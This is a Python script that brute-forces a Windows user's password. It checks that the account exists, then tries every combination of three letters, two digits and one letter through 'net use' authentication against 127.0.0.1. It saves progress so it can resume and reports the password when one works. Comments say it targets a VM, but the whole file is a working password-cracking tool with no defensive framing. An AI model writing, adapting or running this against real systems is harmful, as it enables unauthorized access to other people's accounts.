import itertools
import subprocess
import os
import time
import pickle

# --- CONFIG ---
user = "Fortnite Rizzler"  # VM username, spaces supported
letters = "abcdefghijklmnopqrstuvwxyz"
numbers = "0123456789"
state_file = "sigma_state.pkl"
log_file = "logs/error_log.txt"
save_every = 100      # Save progress every N combos
chunk_size = 50000    # Pause every chunk for stability

# --- SETUP LOGS ---
os.makedirs("logs", exist_ok=True)
if not os.path.exists(log_file):
    with open(log_file, "w") as f:
        f.write(f"SIGMA SESSION START {time.ctime()}\n")

# --- LOAD LAST STATE ---
try:
    with open(state_file, "rb") as f:
        last_index = pickle.load(f)
except:
    last_index = 0

count = 0
combo_count = 0

# --- PRECHECK USER ---
check = subprocess.run(f'net user "{user}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
if check.returncode != 0:
    with open(log_file, "a") as f:
        f.write(f"{time.ctime()} USER {user} DOES NOT EXIST!\n")
    print(f"SIGMA ALERT: User '{user}' does not exist. Exiting.")
    exit()

# --- COMBO GENERATOR ---
def combo_generator():
    for l1 in letters:
        for l2 in letters:
            for l3 in letters:
                for n1 in numbers:
                    for n2 in numbers:
                        for l4 in letters:
                            yield f"{l1}{l2}{l3}{n1}{n2}{l4}"

# --- MAIN LOOP ---
for combo in combo_generator():
    count += 1
    combo_count += 1
    if count <= last_index:
        continue  # skip already attempted combos

    print(f"[ATTEMPT {count}] {combo}", end="\r")

    # --- ATTEMPT NET USE ---
    try:
        result = subprocess.run(f'net use \\\\127.0.0.1 /user:"{user}" {combo}', 
                                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        if result.returncode == 0:
            print(f"\n[+] PASSWORD FOUND: {combo}")
            break
        else:
            with open(log_file, "a") as f:
                f.write(f"{time.ctime()} ERROR on combo {combo}: {result.stderr.decode(errors='ignore')}\n")
    except Exception as e:
        with open(log_file, "a") as f:
            f.write(f"{time.ctime()} EXCEPTION on combo {combo}: {str(e)}\n")

    # --- SAVE PROGRESS ---
    if count % save_every == 0:
        with open(state_file, "wb") as f:
            pickle.dump(count, f)

    # --- CHUNK PAUSE ---
    if combo_count >= chunk_size:
        combo_count = 0
        time.sleep(1)  # small pause for VM stability

print("\nSIGMA GRIND COMPLETE, MY TOILET!")
